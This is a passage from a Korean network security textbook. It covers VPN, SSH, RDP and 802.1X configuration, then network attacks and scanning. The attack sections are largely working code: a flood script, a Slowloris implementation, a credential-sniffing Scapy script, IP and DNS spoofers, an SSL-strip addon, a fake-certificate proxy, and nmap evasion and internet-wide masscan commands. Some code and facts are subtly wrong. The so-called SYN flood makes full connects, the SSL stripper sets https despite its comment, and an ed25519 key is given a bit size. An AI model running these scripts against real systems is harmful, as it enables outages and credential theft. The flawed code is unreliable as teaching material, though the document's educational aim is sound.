ipsec pki --gen --type rsa --size 4096 --outform pem > ca-key.pem
ipsec pki --self --ca --lifetime 3652 --in ca-key.pem --type rsa --dn "CN=VPN CA" --outform pem > ca-cert.pem

# 서버 인증서 생성
ipsec pki --gen --type rsa --size 4096 --outform pem > server-key.pem
ipsec pki --req --type priv --in server-key.pem --dn "CN=vpn.example.com" --san @vpn.example.com --outform pem > server-req.pem
ipsec pki --issue --lifetime 1827 --cacert ca-cert.pem --cakey ca-key.pem --type pkcs10 --in server-req.pem --outform pem > server-cert.pem

# /etc/ipsec.conf 설정
config setup
    charondebug="ike 1, knl 1, cfg 0"
    uniqueids=no

conn ikev2-vpn
    auto=add
    compress=no
    type=tunnel
    keyexchange=ikev2
    fragmentation=yes
    forceencaps=yes

    # 서버 설정
    left=%any
    leftid=@vpn.example.com
    leftcert=server-cert.pem
    leftsendcert=always
    leftsubnet=0.0.0.0/0

    # 클라이언트 설정
    right=%any
    rightid=%any
    rightauth=eap-mschapv2
    rightsourceip=10.10.10.0/24
    rightdns=8.8.8.8,8.8.4.4
    rightsendcert=never

    # 암호화 설정
    ike=chacha20poly1305-sha512-curve25519-prfsha512,aes256gcm16-sha384-prfsha384-ecp384!
    esp=chacha20poly1305-sha512,aes256gcm16-ecp384!

    # 기타 설정
    dpdaction=clear
    dpddelay=300s
    rekey=no
```

###### IKEv2 프로토콜 흐름

```plaintext
IKEv2 Exchange:
1. IKE_SA_INIT (4 messages)
   Client -> Server: SAi1, KEi, Ni
   Server -> Client: SAr1, KEr, Nr, [CERTREQ]

2. IKE_AUTH (2-6 messages)
   Client -> Server: IDi, [CERT,] [CERTREQ,] [IDr,] AUTH, SAi2, TSi, TSr
   Server -> Client: IDr, [CERT,] AUTH, SAr2, TSi, TSr

3. CHILD_SA established
   Data encryption with ESP

보안 장점:
- 더 적은 메시지 교환 (4-6 vs 9-12)
- 내장 DoS 방어
- 모바일 지원 (MOBIKE)
- 강화된 암호화 알고리즘 지원
```

##### SSL/TLS VPN 상세

###### SSL VPN 아키텍처 종류

```plaintext
1. SSL Portal VPN:
   - 웹 포털을 통한 접근
   - 웹 애플리케이션만 접근 가능
   - 간단한 설정, 제한적 기능

2. SSL Tunnel VPN:
   - 전체 네트워크 접근 가능
   - 가상 네트워크 어댑터 사용
   - 클라이언트 소프트웨어 필요

3. SSL Application VPN:
   - 특정 애플리케이션만 터널링
   - 포트 포워딩 방식
   - 애플리케이션별 세밀한 제어
```

###### OpenVPN 서버 구축

```bash
# OpenVPN 설치
apt-get install openvpn easy-rsa

# PKI 환경 설정
make-cadir ~/openvpn-ca
cd ~/openvpn-ca
source vars

# CA 생성
./clean-all
./build-ca

# 서버 키 생성
./build-key-server server
./build-dh
openvpn --genkey --secret keys/ta.key

# 클라이언트 키 생성
./build-key client1

# 서버 설정 파일 (/etc/openvpn/server.conf)
port 1194
proto udp
dev tun

# 인증서 및 키
ca ca.crt
cert server.crt
key server.key
dh dh2048.pem
tls-auth ta.key 0

# 네트워크 설정
server 10.8.0.0 255.255.255.0
ifconfig-pool-persist ipp.txt

# 라우팅 설정
push "redirect-gateway def1 bypass-dhcp"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"

# 보안 설정
client-to-client
duplicate-cn
keepalive 10 120
tls-version-min 1.2
cipher AES-256-CBC
auth SHA256
comp-lzo

# 로깅
status openvpn-status.log
log openvpn.log
verb 3

# 클라이언트 설정 파일 (client.ovpn)
client
dev tun
proto udp
remote vpn.example.com 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
cert client1.crt
key client1.key
tls-auth ta.key 1
cipher AES-256-CBC
auth SHA256
comp-lzo
verb 3
```

###### WireGuard 차세대 VPN

```bash
# WireGuard 설치 (Ubuntu 20.04+)
apt install wireguard

# 키 생성
wg genkey | tee server_private_key | wg pubkey > server_public_key
wg genkey | tee client_private_key | wg pubkey > client_public_key

# 서버 설정 (/etc/wireguard/wg0.conf)
[Interface]
PrivateKey = <server_private_key>
Address = 10.0.0.1/24
ListenPort = 51820
SaveConfig = true

# 클라이언트 추가
PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32

# 클라이언트 설정
[Interface]
PrivateKey = <client_private_key>
Address = 10.0.0.2/24
DNS = 8.8.8.8

[Peer]
PublicKey = <server_public_key>
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 21

# 서비스 시작
systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0

# WireGuard 장점
- 현대적 암호화 (ChaCha20, Poly1305)
- 간단한 설정
- 뛰어난 성능
- 작은 코드베이스 (보안 검토 용이)
```

#### 3.3.2 원격 접속 보안 상세

##### SSH (Secure Shell) 완전 가이드

###### SSH 프로토콜 구조

```plaintext
SSH Protocol Stack:
1. Transport Layer (SSH-TRANS)
   - 서버 인증
   - 암호화 및 무결성
   - 압축

2. User Authentication (SSH-USERAUTH)
   - 사용자 인증
   - 다양한 인증 방법 지원

3. Connection Protocol (SSH-CONNECT)
   - 채널 멀티플렉싱
   - 포트 포워딩
   - X11 포워딩
```

###### SSH 서버 보안 강화

```bash
# /etc/ssh/sshd_config 보안 설정
# 프로토콜 및 포트
Protocol 2
Port 2222  # 기본 포트 변경

# 로그인 제한
PermitRootLogin no
MaxAuthTries 3
MaxSessions 3
LoginGraceTime 30

# 사용자 및 그룹 제한
AllowUsers user1 user2
AllowGroups sshusers
DenyUsers baduser
DenyGroups wheel

# 인증 방법
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
PermitEmptyPasswords no
ChallengeResponseAuthentication no

# X11 및 포트 포워딩
X11Forwarding no
AllowTcpForwarding no
AllowStreamLocalForwarding no
GatewayPorts no

# 기타 보안 설정
UsePrivilegeSeparation sandbox
StrictModes yes
IgnoreRhosts yes
HostbasedAuthentication no
PermitUserEnvironment no
ClientAliveInterval 300
ClientAliveCountMax 2
Compression no

# 로깅
SyslogFacility AUTHPRIV
LogLevel VERBOSE

# 키 교환 알고리즘 제한 (강력한 알고리즘만)
KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group16-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512
```

###### SSH 키 기반 인증 구성

```bash
# 클라이언트에서 키 생성
ssh-keygen -t ed25519 -b 4096 -f ~/.ssh/id_ed25519 -C "user@client"
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -C "user@client"  # 레거시 호환

# 공개키 서버 전송
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server
# 또는 수동 복사
cat ~/.ssh/id_ed25519.pub | ssh user@server "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# 서버에서 권한 설정
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH 에이전트 사용
ssh-agent bash
ssh-add ~/.ssh/id_ed25519

# SSH 설정 파일 (~/.ssh/config)
Host production
    HostName prod.example.com
    User admin
    Port 2222
    IdentityFile ~/.ssh/id_ed25519
    IdentitiesOnly yes
    ServerAliveInterval 60
    ServerAliveCountMax 3

Host bastion
    HostName bastion.example.com
    User jumpuser
    LocalForward 8080 internal.example.com:80
    DynamicForward 1080
```

###### SSH 터널링 기법

```bash
# 로컬 포트 포워딩 (Local Port Forwarding)
ssh -L 8080:internal.example.com:80 user@gateway.com
# localhost:8080 -> gateway.com -> internal.example.com:80

# 원격 포트 포워딩 (Remote Port Forwarding)
ssh -R 9090:localhost:80 user@external.com
# external.com:9090 -> user@client -> localhost:80

# 동적 포트 포워딩 (SOCKS Proxy)
ssh -D 1080 user@proxy.com
# 모든 트래픽을 SOCKS 프록시로 터널링

# X11 포워딩
ssh -X user@server
ssh -Y user@server  # 신뢰할 수 있는 X11 포워딩

# SSH over SSH (점프 박스)
ssh -J jumpbox.com user@internal.com
ssh -o ProxyCommand="ssh -W %h:%p user@jumpbox.com" user@internal.com

# 영구 터널 (autossh)
autossh -M 20000 -f -N -L 8080:internal:80 user@gateway
```

##### RDP (Remote Desktop Protocol) 보안

###### RDP 보안 강화

```powershell
# 네트워크 레벨 인증 활성화
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1

# 암호화 레벨 설정 (최고)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MinEncryptionLevel" -Value 3

# 계정 잠금 정책
net accounts /lockoutthreshold:3 /lockoutduration:30 /lockoutwindow:30

# 방화벽 규칙 (특정 IP만 허용)
New-NetFirewallRule -DisplayName "RDP-Custom" -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 192.168.1.0/24 -Action Allow

# 기본 포트 변경
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber" -Value 13389

# 인증서 기반 인증
# RDP 게이트웨이 서버 구성 필요
```

###### RDP over SSH 터널링

```bash
# Linux에서 Windows RDP 접속
ssh -L 3389:windows-server:3389 user@gateway
rdesktop localhost:3389

# Windows PowerShell에서 SSH 터널
ssh -L 3389:target-server:3389 user@gateway
mstsc /v:localhost:3389
```

#### 3.3.3 네트워크 접근 제어 (NAC) 상세

##### 802.1X 인증 메커니즘

###### EAP (Extensible Authentication Protocol) 방식들

```plaintext
EAP-TLS (가장 안전):
1. 클라이언트와 서버 모두 인증서 필요
2. 상호 인증 제공
3. 강력한 보안, 복잡한 PKI 인프라

EAP-TTLS (Tunneled TLS):
1. 서버만 인증서 필요
2. 클라이언트는 사용자명/패스워드
3. 내부 터널에서 다양한 인증 방법 지원

PEAP (Protected EAP):
1. Microsoft 주도 표준
2. MSCHAPv2 내부 인증 방식
3. Windows 환경에서 널리 사용

EAP-FAST (Flexible Authentication via Secure Tunneling):
1. Cisco 독점 방식
2. PAC (Protected Access Credential) 사용
3. 빠른 재연결 지원
```

###### FreeRADIUS 서버 구축

```bash
# FreeRADIUS 설치
apt-get install freeradius freeradius-mysql freeradius-utils

# 기본 설정 (/etc/freeradius/3.0/radiusd.conf)
prefix = /usr
exec_prefix = /usr
sysconfdir = /etc
localstatedir = /var
sbindir = /usr/sbin
logdir = /var/log/freeradius
raddbdir = /etc/freeradius/3.0
radacctdir = /var/log/freeradius/radacct

# 클라이언트 설정 (/etc/freeradius/3.0/clients.conf)
client switch01 {
    ipaddr = 192.168.1.100
    secret = testing123-switch
    require_message_authenticator = yes
    nas_type = cisco
}

client ap01 {
    ipaddr = 192.168.1.200
    secret = testing123-ap
    require_message_authenticator = yes
    nas_type = other
}

# 사용자 설정 (/etc/freeradius/3.0/users)
# 사용자 인증
"john" Cleartext-Password := "password123"
    Reply-Message := "Welcome John",
    Tunnel-Type = VLAN,
    Tunnel-Medium-Type = IEEE-802,
    Tunnel-Private-Group-Id = "100"

# 그룹 기반 VLAN 할당
DEFAULT Group == "employees"
    Tunnel-Type = VLAN,
    Tunnel-Medium-Type = IEEE-802,
    Tunnel-Private-Group-Id = "200"

DEFAULT Group == "guests"
    Tunnel-Type = VLAN,
    Tunnel-Medium-Type = IEEE-802,
    Tunnel-Private-Group-Id = "300"

# EAP 설정 (/etc/freeradius/3.0/mods-available/eap)
eap {
    default_eap_type = peap
    timer_expire = 60
    ignore_unknown_eap_types = no
    cisco_accounting_username_bug = no
    max_sessions = 4096

    tls-config tls-common {
        certificate_file = /etc/ssl/certs/radius.crt
        private_key_file = /etc/ssl/private/radius.key
        ca_file = /etc/ssl/certs/ca.crt
        cipher_list = "HIGH"
        cipher_server_preference = yes
        tls_min_version = "1.2"
    }

    peap {
        tls = tls-common
        default_method = mschapv2
        copy_request_to_tunnel = yes
        use_tunneled_reply = yes
        virtual_server = "inner-tunnel"
    }
}
```

###### 스위치 802.1X 설정 (Cisco)

```bash
# 전역 802.1X 활성화
aaa new-model
aaa authentication dot1x default group radius
aaa authorization network default group radius
radius server ISE
 address ipv4 192.168.1.10 auth-port 1812 acct-port 1813
 key testing123

# 인터페이스 802.1X 설정
interface FastEthernet0/1
 switchport mode access
 switchport access vlan 999  # 기본 제한 VLAN
 authentication host-mode multi-auth
 authentication port-control auto
 authentication periodic
 authentication timer restart 30
 authentication timer reauthenticate 3600
 authentication violation shutdown
 dot1x pae authenticator
 dot1x timeout tx-period 10
 spanning-tree portfast
 spanning-tree bpduguard enable

# VLAN 동적 할당
vlan 100
 name Employee_VLAN
vlan 200
 name IT_VLAN
vlan 300
 name Guest_VLAN
vlan 999
 name Quarantine_VLAN
```

##### 최신 NAC 기술

###### Software-Defined Perimeter (SDP)

```plaintext
SDP 구성 요소:
1. SDP Controller
   - 정책 관리
   - 인증 및 권한 부여
   - 암호화된 제어 채널

2. SDP Gateway
   - 네트워크 진입점
   - 트래픽 필터링
   - 마이크로 터널 종료점

3. SDP Client
   - 엔드포인트 에이전트
   - 장치 신원 확인
   - 암호화된 터널 생성

보안 장점:
- Zero Trust 아키텍처
- 다크 클라우드 (서비스 발견 불가)
- 엔드투엔드 암호화
- 세밀한 접근 제어
```

###### Identity-Based Networking

```python
# 사용자 컨텍스트 기반 접근 제어 예시
class IdentityBasedAccess:
    def __init__(self):
        self.policies = {
            'executive': {
                'allowed_networks': ['finance', 'hr', 'general'],
                'allowed_times': '24/7',
                'bandwidth_limit': None
            },
            'employee': {
                'allowed_networks': ['general', 'department_specific'],
                'allowed_times': '09:00-18:00',
                'bandwidth_limit': '10Mbps'
            },
            'contractor': {
                'allowed_networks': ['guest'],
                'allowed_times': '09:00-17:00',
                'bandwidth_limit': '5Mbps'
            }
        }

    def authorize_access(self, user_identity, requested_resource, current_time):
        user_role = self.get_user_role(user_identity)
        policy = self.policies.get(user_role)

        if not policy:
            return False, "Unknown user role"

        # 네트워크 접근 권한 확인
        if requested_resource not in policy['allowed_networks']:
            return False, "Network access denied"

        # 시간 기반 접근 제어
        if not self.is_time_allowed(current_time, policy['allowed_times']):
            return False, "Access not allowed at this time"

        return True, f"Access granted with {policy['bandwidth_limit']} bandwidth"
```

### 3.4 네트워크 공격과 방어

#### 3.4.1 서비스 거부 공격 (DoS/DDoS) 상세

##### DoS 공격 역사와 분류

```plaintext
DoS 공격 발전사:
1988: Morris Worm - 최초 대규모 DoS
1999: Trinoo - 최초 DDoS 도구
2000: Mafiaboy - Yahoo, CNN 등 주요 사이트 공격
2007: Estonia 사이버 공격
2016: Mirai 봇넷 - IoT 기기 악용
2018: GitHub - 최대 1.35Tbps DDoS 공격
2020: AWS - 최대 2.3Tbps DDoS 공격
```

##### DoS 공격 메커니즘 상세

###### 네트워크 계층 공격

```bash
# Ping of Death 공격 시뮬레이션 (교육용)
# 정상적인 ICMP 패킷 크기 초과
ping -s 65500 target_ip

# Land 공격 - 동일한 소스/목적지 IP
hping3 -S -a target_ip target_ip -p 80

# Smurf 공격 - ICMP 브로드캐스트 증폭
hping3 -1 -a target_ip broadcast_ip

# 방어 설정 (Linux)
# ICMP 리다이렉트 비활성화
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
# ICMP 응답 제한
echo 1 > /proc/sys/net/ipv4/icmp_ratelimit
# SYN 쿠키 활성화
echo 1 > /proc/sys/net/ipv4/tcp_syncookies
```

###### 전송 계층 공격

```python
# SYN Flood 공격 시뮬레이션 (교육용)
import socket
import threading
import random

def syn_flood(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            # 랜덤 소스 포트 사용
            source_port = random.randint(1024, 65535)
            sock.bind(('', source_port))
            sock.connect((target_ip, target_port))
            sock.close()
        except:
            pass

# 멀티스레드 공격
target = "192.168.1.100"
port = 80
for i in range(100):
    thread = threading.Thread(target=syn_flood, args=(target, port))
    thread.start()
```

###### 애플리케이션 계층 공격

```python
# Slowloris 공격 구현 (교육용)
import socket
import threading
import time

class Slowloris:
    def __init__(self, target, port, connections=100):
        self.target = target
        self.port = port
        self.connections = connections
        self.sockets = []

    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))

            # 불완전한 HTTP 요청 전송
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {self.target}\r\n".encode())
            sock.send(b"Connection: keep-alive\r\n")
            return sock
        except:
            return None

    def attack(self):
        # 초기 연결 생성
        for i in range(self.connections):
            sock = self.create_socket()
            if sock:
                self.sockets.append(sock)

        while True:
            # 연결 유지를 위한 헤더 전송
            for sock in self.sockets[:]:
                try:
                    sock.send(b"X-a: b\r\n")
                except:
                    self.sockets.remove(sock)
                    new_sock = self.create_socket()
                    if new_sock:
                        self.sockets.append(new_sock)

            time.sleep(15)
```

##### DDoS 공격 분류와 대응

###### 볼류메트릭 공격 (Volumetric Attack)

```plaintext
DNS 증폭 공격:
1. 공격자가 작은 DNS 쿼리 전송 (소스 IP 스푸핑)
2. DNS 서버가 큰 응답을 피해자에게 전송
3. 증폭 비율: 최대 1:179

NTP 증폭 공격:
1. monlist 명령 악용 (NTP v2/v3)
2. 증폭 비율: 최대 1:556

memcached 증폭 공격:
1. UDP 포트 11211 대상
2. 증폭 비율: 최대 1:51,000

방어 기법:
- BCP 38 (Ingress Filtering) 구현
- Open Resolver 차단
- Rate Limiting 적용
```

```bash
# DNS 서버 증폭 공격 방지 설정 (BIND)
# /etc/bind/named.conf.options
options {
    rate-limit {
        responses-per-second 5;
        window 5;
        slip 2;
    };
    recursion no;  # Open Resolver 방지
    allow-query { localhost; 192.168.1.0/24; };
};

# NTP 서버 보안 설정
# /etc/ntp.conf
disable monitor  # monlist 명령 비활성화
restrict default kod nomodify notrap nopeer noquery
restrict -6 default kod nomodify notrap nopeer noquery
```

###### 프로토콜 공격 (Protocol Attack)

```bash
# SYN Flood 방어 (Linux)
# SYN 큐 크기 증가
echo 8192 > /proc/sys/net/ipv4/tcp_max_syn_backlog

# SYN-ACK 재전송 횟수 감소
echo 1 > /proc/sys/net/ipv4/tcp_synack_retries

# SYN 쿠키 활성화
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

# 연결 타임아웃 단축
echo 60 > /proc/sys/net/ipv4/tcp_keepalive_time

# iptables를 이용한 연결 제한
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

##### DDoS 방어 솔루션

###### 온프레미스 DDoS 방어

```plaintext
하드웨어 기반:
- F5 DDoS Hybrid Defender
- Radware DefensePro
- Arbor TMS (Threat Mitigation System)
- Corero Network Security

소프트웨어 기반:
- pfSense (오픈소스)
- fail2ban
- DDoS-Deflate
```

```bash
# fail2ban DDoS 방어 설정
# /etc/fail2ban/jail.local
[http-get-dos]
enabled = true
port = http,https
filter = http-get-dos
logpath = /var/log/apache2/access.log
maxretry = 300
findtime = 300
bantime = 600
action = iptables[name=HTTP, port=http, protocol=tcp]

# /etc/fail2ban/filter.d/http-get-dos.conf
[Definition]
failregex = ^<HOST> -.*"(GET|POST).*
ignoreregex =
```

###### 클라우드 기반 DDoS 방어

```plaintext
클라우드 DDoS 방어 서비스:
- Cloudflare DDoS Protection
- AWS Shield (Standard/Advanced)
- Azure DDoS Protection
- Google Cloud Armor

장점:
- 대용량 트래픽 처리 (Tbps 급)
- 글로벌 분산 방어
- AI/ML 기반 자동 탐지
- 실시간 트래픽 분석
```

#### 3.4.2 스니핑과 스푸핑 상세

##### 네트워크 스니핑 기술

###### 패킷 캡처 메커니즘

```python
# Scapy를 이용한 패킷 캡처 및 분석
from scapy.all import *
import re

def packet_handler(packet):
    # HTTP 트래픽 분석
    if packet.haslayer(Raw) and packet.haslayer(TCP):
        payload = str(packet[Raw].load)

        # HTTP 인증 정보 추출
        if "Authorization: Basic" in payload:
            auth_header = re.search(r'Authorization: Basic ([^\r\n]*)', payload)
            if auth_header:
                import base64
                try:
                    decoded = base64.b64decode(auth_header.group(1)).decode()
                    print(f"HTTP Basic Auth found: {decoded}")
                except:
                    pass

        # POST 데이터 추출
        if "POST" in payload:
            print(f"POST request to: {packet[IP].dst}")
            print(f"Data: {payload}")

# 네트워크 인터페이스에서 패킷 캡처
sniff(iface="eth0", prn=packet_handler, filter="tcp port 80")
```

###### 스위치 환경에서의 스니핑

```bash
# MAC 플러딩을 통한 스위치 CAM 테이블 오버플로우
macof -i eth0 -n 10000

# ARP 스푸핑을 통한 트래픽 리다이렉트
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.0/24//

# DHCP 스푸핑
yersinia -G  # GUI 모드에서 DHCP 공격 수행

# 스위치 포트 미러링 (관리자용)
# Cisco 스위치 예시
monitor session 1 source interface fastethernet0/1
monitor session 1 destination interface fastethernet0/24
```

##### 프로토콜별 스푸핑 공격

###### IP 스푸핑

```python
# Raw 소켓을 이용한 IP 스푸핑
import socket
import struct

def create_ip_header(source_ip, dest_ip):
    version = 4
    ihl = 5
    tos = 0
    total_length = 20 + 8  # IP header + ICMP header
    identification = 54321
    flags = 0
    fragment_offset = 0
    ttl = 255
    protocol = 1  # ICMP
    checksum = 0  # 커널이 계산

    ihl_version = (version << 4) + ihl

    # IP 헤더 패킹
    ip_header = struct.pack('!BBHHHBBH4s4s',
                           ihl_version, tos, total_length,
                           identification, flags, ttl, protocol,
                           checksum, socket.inet_aton(source_ip),
                           socket.inet_aton(dest_ip))
    return ip_header

# 스푸핑된 ICMP 패킷 전송
def send_spoofed_packet(source_ip, dest_ip):
    # Raw 소켓 생성 (관리자 권한 필요)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    ip_header = create_ip_header(source_ip, dest_ip)
    icmp_header = struct.pack('!BBHHH', 8, 0, 0, 0, 1)  # ICMP Echo Request

    packet = ip_header + icmp_header
    sock.sendto(packet, (dest_ip, 0))
    sock.close()
```

###### DNS 스푸핑

```python
# DNS 응답 스푸핑
from scapy.all import *
import threading

class DNSSpoofer:
    def __init__(self, target_domain, fake_ip):
        self.target_domain = target_domain
        self.fake_ip = fake_ip

    def dns_responder(self, packet):
        if packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode()

            # 타겟 도메인 쿼리인지 확인
            if self.target_domain in qname:
                # 가짜 DNS 응답 생성
                spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                             UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                             DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                 an=DNSRR(rrname=packet[DNS].qd.qname,
                                         ttl=10, rdata=self.fake_ip))

                send(spoofed_pkt, verbose=0)
                print(f"Spoofed DNS response for {qname} -> {self.fake_ip}")

    def start_spoofing(self):
        print(f"Starting DNS spoofing for {self.target_domain}")
        sniff(filter="udp port 53", prn=self.dns_responder)

# 사용 예시
spoofer = DNSSpoofer("example.com", "192.168.1.100")
spoofer.start_spoofing()
```

#### 3.4.3 중간자 공격 (MITM) 상세

##### SSL/TLS 중간자 공격

###### SSL Strip 공격

```python
# SSL Strip 공격 구현 (교육용)
import re
from mitmproxy import http

class SSLStripper:
    def __init__(self):
        self.secure_links = set()

    def request(self, flow: http.HTTPFlow) -> None:
        # HTTPS 요청을 HTTP로 변경
        if flow.request.scheme == "https":
            flow.request.scheme = "https"
            flow.request.port = 443
            self.secure_links.add(flow.request.host)

    def response(self, flow: http.HTTPFlow) -> None:
        # 응답에서 HTTPS 링크를 HTTP로 변경
        if flow.response.content:
            content = flow.response.get_text()
            if content:
                # https:// 링크를 http://로 변경
                content = re.sub(r'https://', 'http://', content)
                # secure 플래그 제거
                content = re.sub(r'; secure', '', content, flags=re.IGNORECASE)
                flow.response.set_text(content)

addons = [SSLStripper()]
```

###### SSL 인증서 대체 공격

```bash
# 자체 서명 인증서 생성
openssl genrsa -out fake.key 2048
openssl req -new -key fake.key -out fake.csr
openssl x509 -req -days 365 -in fake.csr -signkey fake.key -out fake.crt

# Apache에서 가짜 인증서 사용
# /etc/apache2/sites-available/ssl.conf
<VirtualHost *:443>
    ServerName target.com
    SSLEngine on
    SSLCertificateFile /path/to/fake.crt
    SSLCertificateKeyFile /path/to/fake.key

    # 실제 서버로 프록시
    ProxyPass / https://real-target.com/
    ProxyPassReverse / https://real-target.com/
</VirtualHost>
```

##### MITM 방어 기술

###### HTTP Public Key Pinning (HPKP)

```http
# HTTP 헤더를 통한 인증서 피닝
Public-Key-Pins: pin-sha256="d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=";
                  pin-sha256="E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=";
                  max-age=5184000; includeSubDomains;
                  report-uri="https://example.com/hpkp-report"

# 인증서 핀 생성
openssl x509 -in cert.pem -pubkey -noout | \
openssl pkey -pubin -outform der | \
openssl dgst -sha256 -binary | \
openssl enc -base64
```

###### Certificate Transparency (CT)

```python
# CT 로그 모니터링
import requests
import base64
import json

def check_ct_logs(domain):
    ct_logs = [
        "https://ct.googleapis.com/logs/argon2023/",
        "https://ct.cloudflare.com/logs/nimbus2023/",
    ]

    for log_url in ct_logs:
        try:
            response = requests.get(f"{log_url}ct/v1/get-entries",
                                  params={"domain": domain})
            entries = response.json()

            for entry in entries.get("entries", []):
                leaf_input = base64.b64decode(entry["leaf_input"])
                # 인증서 파싱 및 검증
                print(f"Found certificate for {domain} in CT log")

        except Exception as e:
            print(f"Error checking CT log: {e}")
```

#### 3.4.4 보안 스캔과 취약점 평가 상세

##### 포트 스캔 기법 심화

###### Nmap 고급 스캔 기법

```bash
# 스텔스 스캔 기법들
nmap -sS target_ip                    # SYN 스캔 (스텔스)
nmap -sF target_ip                    # FIN 스캔
nmap -sN target_ip                    # NULL 스캔
nmap -sX target_ip                    # XMAS 스캔
nmap -sA target_ip                    # ACK 스캔 (방화벽 우회)

# 방화벽 회피 기법
nmap -f target_ip                     # 패킷 단편화
nmap -D RND:10 target_ip             # 디코이 사용
nmap --source-port 53 target_ip      # 소스 포트 변경
nmap --data-length 25 target_ip      # 데이터 길이 변경
nmap --badsum target_ip              # 잘못된 체크섬

# OS 및 서비스 탐지
nmap -O target_ip                     # OS 탐지
nmap -sV target_ip                    # 서비스 버전 탐지
nmap -A target_ip                     # 적극적 스캔 (OS, 서비스, 스크립트)

# NSE 스크립트 활용
nmap --script vuln target_ip          # 취약점 스캔
nmap --script default target_ip       # 기본 스크립트
nmap --script http-enum target_ip     # HTTP 디렉토리 열거
nmap --script ssl-cert target_ip      # SSL 인증서 정보

# 타이밍 조정
nmap -T0 target_ip                    # 매우 느림 (IDS 회피)
nmap -T1 target_ip                    # 느림
nmap -T2 target_ip                    # 정중함
nmap -T3 target_ip                    # 기본값
nmap -T4 target_ip                    # 빠름
nmap -T5 target_ip                    # 매우 빠름 (노이지)
```

###### Masscan 고성능 스캔
```bash
# 인터넷 전체 스캔 (주의: 합법적 목적만)
masscan 0.0.0.0/0 -p80,443 --rate=1000

# 특정 대역 고속 스캔
masscan 192.168.1.0/24 -p1-65535 --rate=10000

# 출력 형식 지정
masscan 192.168.1.0/24 -p80,443 -oG results.gnmap
masscan 192.168.1.0/24 -p80,443 -oX results.xml
```

##### 취약점 스캐닝 자동화

###### OpenVAS 스캔 자동화

```python
# OpenVAS API를 통한 자동 스캔
from openvas_lib import VulnscanManager, VulnscanException

class AutoVulnScanner:
    def __init__(self, host, username, password):
        self.manager = VulnscanManager(host, username, password)

    def create_scan_config(self, name, targets):
        # 스캔 설정 생성
        config_id = self.manager.create_scan_config(
            name=name,
            comment="Automated vulnerability scan"
        )

        # 타겟 생성
        target_id = self.manager.create_target(
            name=f"{name}_targets",
            hosts=targets,
            comment="Auto-generated targets"
        )

        return config_id, target_id

    def run_scan(self, name, targets):
        try:
            config_id, target_id = self.create_scan_config(name, targets)

            # 스캔 태스크 생성
            task_id = self.manager.create_task(
                name=name,
                target=target_id,
                config=config_id,
                comment="Automated scan task"
            )

            # 스캔 시작
            self.manager.start_task(task_id)
            print(f"Scan started with task ID: {task_id}")

            return task_id

        except VulnscanException as e:
            print(f"Scan failed: {e}")
            return None

# 사용 예시
scanner = AutoVulnScanner("localhost", "admin", "password")
task_id = scanner.run_scan("weekly_scan", ["192.168.1.0/24"])
```

###### Nessus API 활용

```python
# Nessus API를 통한 스캔 관리
import requests
import json

class NessusScanner:
    def __init__(self, url, access_key, secret_key):
        self.url = url
        self.headers = {
            'X-ApiKeys': f'accessKey={access_key}; secretKey={secret_key}',
            'Content-Type': 'application/json'
        }

    def create_scan(self, name, targets, template_uuid):
        scan_data = {
            "uuid": template_uuid,
            "settings": {
                "name": name,
                "text_targets": targets,
                "enabled": True
            }
        }

        response = requests.post(
            f"{self.url}/scans",
            headers=self.headers,
            data=json.dumps(scan_data)
        )

        if response.status_code == 200:
            return response.json()['scan']['id']
        else:
            raise Exception(f"Failed to create scan: {response.text}")

    def launch_scan(self, scan_id):
        response = requests.post(
            f"{self.url}/scans/{scan_id}/launch",
            headers=self.headers
        )

